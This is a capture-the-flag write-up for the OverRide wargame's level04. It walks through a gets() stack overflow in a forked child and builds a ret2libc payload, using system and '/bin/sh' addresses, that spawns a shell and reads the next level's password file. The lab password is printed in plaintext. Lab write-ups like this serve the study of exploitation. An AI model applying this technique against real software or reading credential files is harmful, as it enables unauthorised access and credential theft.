It looks like a buffer overflow in here, but since it will be inside a child of a fork, so we won't have a segfault.

```c
	int local_a0 [32];

	local_14 = fork();

	if (local_14 == 0) {
		prctl(1,1);
		ptrace(PTRACE_TRACEME,0,0,0);
		puts("Give me some shellcode, k");
		gets((char *)local_a0);
	}
```

After some try, we got this :

```bash
level04@OverRide:~$ cat <(python -c 'print("AAAA" * 40)') - | ./level04 
Give me some shellcode, k
hello
wtf ?!?!
^C
```

The only way of exiting the program was for me to `ctrl+C`
With gdb, we got the same result :

```bash
level04@OverRide:~$ gdb -q level04 
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 4241]
Give me some shellcode, k
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 4241]
0x42424242 in ?? ()
```

So, as we did in rainfall, we just need to find the address of system and the string `"/bin/sh"` and we are good to go.

```assembly
(gdb) disas system
Dump of assembler code for function system:
   0xf7e6aed0 <+0>:	sub    $0x1c,%esp
```

```assembly
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

```



```bash
level04@OverRide:~$ cat <(python -c 'print("AAAA" * 39 + "\xd0\xae\xe6\xf7" + "IDGB" + "\xec\x97\xf8\xf7")') - | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

```bash
su level05
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```



